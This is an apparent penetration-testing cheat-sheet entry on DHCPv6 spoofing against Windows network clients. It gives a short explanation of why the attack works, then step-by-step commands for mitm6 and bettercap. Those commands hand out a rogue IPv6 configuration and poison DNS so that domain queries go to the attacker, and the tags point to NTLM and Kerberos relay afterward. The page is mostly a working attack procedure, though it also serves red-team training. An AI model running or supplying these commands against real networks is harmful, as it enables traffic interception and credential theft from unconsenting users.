---
technique: DHCPv6 Spoofing
category: mitm
targets: Windows Network Clients
protocols: DHCPv6, DNS
remote_capable: false
tags: mitm dhcpv6 dns-spoofing ipv6 network ntlm-relay kerberos-relay
---

# DHCPv6 Spoofing

IPv6 is enabled and takes priority over IPv4 on Windows by default but is rarely configured. When Windows machines boot or reconnect, they broadcast DHCPv6 requests. Attackers on the same network can respond with a rogue IPv6 configuration including a malicious DNS server, then answer DNS queries to redirect victims to rogue authentication servers.

## Windows

No native Windows tooling is commonly used for this attack; see the Linux section.

## Linux

mitm6 and bettercap both implement DHCPv6 spoofing with DNS poisoning.

### mitm6

#python #dhcpv6 #dns

Run an all-in-one DHCPv6 spoofer and DNS poisoner that redirects domain DNS queries to the attacker.

```sh title:"DHCPv6 and DNS spoofing for the target domain with mitm6"
mitm6 --interface "$iface" --domain "$domain_fqdn"
```
<!-- cheat
var iface
var domain_fqdn
-->

### Step 1: Configure DHCPv6 spoofing (bettercap)

#go #dhcpv6

Configure the DHCPv6 spoofing domain in bettercap.

```sh title:"Configure DHCPv6 spoofing domain in bettercap"
set dhcp6.spoof.domains $domain_fqdn
```
<!-- cheat
var domain_fqdn
-->

### Step 2: Start DHCPv6 spoofing (bettercap)

#go #dhcpv6

Start the DHCPv6 spoofing module in bettercap to assign attacker-controlled IPv6 addresses.

```sh title:"Start DHCPv6 spoofing module in bettercap"
dhcp6.spoof on
```
<!-- cheat -->

### Step 3: Configure DNS spoofing domain (bettercap)

#go #dns

Configure the DNS spoofing domain in bettercap.

```sh title:"Configure DNS spoofing domain in bettercap"
set dns.spoof.domains $domain_fqdn
```
<!-- cheat
var domain_fqdn
-->

### Step 4: Enable DNS spoofing for all queries (bettercap)

#go #dns

Enable DNS spoofing for all matching queries in bettercap.

```sh title:"Enable DNS spoofing for all queries in bettercap"
set dns.spoof.all true
```
<!-- cheat -->

### Step 5: Start DNS spoofing (bettercap)

#go #dns

Start the DNS spoofing module in bettercap to redirect domain DNS queries to the attacker.

```sh title:"Start DNS spoofing module in bettercap"
dns.spoof on
```
<!-- cheat -->
